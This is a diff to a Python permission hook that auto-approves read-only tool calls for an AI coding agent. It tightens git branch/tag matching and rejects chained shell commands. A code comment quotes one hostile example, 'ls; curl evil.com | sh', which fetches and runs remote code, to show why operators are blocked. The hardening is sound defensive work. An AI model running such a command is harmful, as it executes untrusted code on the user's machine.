@@ -72,7 +72,8 @@ SAFE_BASH_COMMANDS = [
     r"^type\b",
     r"^file\b",
     r"^stat\b",
-    r"^git\s+(status|log|diff|show|branch|tag)\b",
+    r"^git\s+(status|log|diff|show)\b",
+    r"^git\s+(branch|tag)\s*$",  # bare listing only; flags like -D/-d are not auto-allowed
     r"^git\s+remote\s+-v\b",
     r"^npm\s+(list|ls|outdated|view)\b",
     r"^pip\s+(list|show|freeze)\b",
@@ -98,6 +99,11 @@ def is_safe_bash_command(command: str) -> bool:
 
     # Normalize command
     normalized = command.strip()
+
+    # A safe prefix does not make a compound/chained command safe
+    # (e.g. "ls; curl evil.com | sh"). Reject shell operators outright.
+    if any(op in normalized for op in (";", "&&", "||", "|", "&", "`", "$(", ">", "<", "\n")):
+        return False
 
     # Check against safe patterns
     for pattern in SAFE_BASH_COMMANDS:
@@ -168,6 +174,9 @@ def create_allow_response(updated_input: dict | None = None, reason: str | None 
     if updated_input is not None:
         decision["updatedInput"] = updated_input
 
+    if reason:
+        decision["reason"] = reason
+
     return {"hookSpecificOutput": {"hookEventName": "PermissionRequest", "decision": decision}}
 
 
@@ -202,7 +211,7 @@ def log_permission_request(input_data: dict, log_dir: Path):
 
     # Read existing log data or initialize empty list
     if log_path.exists():
-        with open(log_path, "r") as f:
+        with open(log_path) as f:
             try:
                 log_data = json.load(f)
             except (json.JSONDecodeError, ValueError):
@@ -228,7 +237,9 @@ def main():
             help="Auto-allow read-only operations (Read, Glob, Grep, safe Bash commands)",
         )
         parser.add_argument(
-            "--log-only", action="store_true", help="Only log permission requests, do not make decisions"
+            "--log-only",
+            action="store_true",
+            help="Only log permission requests, do not make decisions",
         )
         args = parser.parse_args()
 
